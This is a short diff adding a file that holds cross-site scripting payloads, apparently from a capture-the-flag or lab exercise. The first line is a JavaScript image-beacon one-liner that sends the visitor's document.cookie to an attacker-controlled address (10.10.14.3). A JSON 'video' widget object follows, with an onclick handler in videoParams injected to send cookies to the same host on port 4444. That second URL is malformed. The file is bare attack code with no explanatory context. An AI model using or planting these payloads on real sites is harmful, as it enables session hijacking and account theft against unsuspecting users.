@@ -1,0 +1,12 @@
+new Image().src='http://10.10.14.3/index.php?c='+document.cookie
+
+
+{
+    "type": "video",
+    "url": "<link of a video>",
+    "videoType": "hosted",
+    "videoParams": {
+        "onclick":"this.src='//http://10.10.14.3:4444>'+document.cookie;",
+        "style": "background-color:black"
+    }
+}
